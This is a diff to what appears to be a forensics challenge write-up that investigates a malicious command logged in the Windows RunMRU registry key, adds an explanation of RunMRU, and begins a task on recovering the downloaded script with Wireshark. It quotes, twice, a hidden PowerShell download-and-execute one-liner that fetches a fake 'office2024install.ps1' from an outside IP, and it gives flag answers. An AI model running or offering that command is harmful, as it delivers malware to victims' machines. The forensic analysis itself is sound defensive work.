@@ -25,6 +25,9 @@ a   %tmp%\1
 b   powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"\1
 ```
 
+### RunMRU Forensics
+RunMRU is a registry key contained in each user's registry hive. It logs each input when you run anything from the Run dialogue box (Win+R). For that reason, RunMRU is a known valuable forensics artifact to examine. Since it's an easy way of executing programs, the threat actor may have used it as a way to execute their payload or may have tricked a user into running the malicious command.
+
 ### Flag
 ```text
 powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"
@@ -40,3 +43,13 @@ Because the last write time in the RunMRU key was the malicious powershell comma
 ```text
 2024-09-23 05:07:45
 ```
+
+## Task 3
+The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?
+
+### Investigation
+To get the contents of the powershell script, we can use ![Wireshark](https://www.wireshark.org/) to view the contents of the script since they used unencrypted HTTP to download the script and execute it in memory.
+
+After opening the packet capture with wireshark, we can filter the data to only show network communications going to or from the IP address "43.205.115.44". 
+Filter: 
+- **"ip.dst==43.205.115.44"**
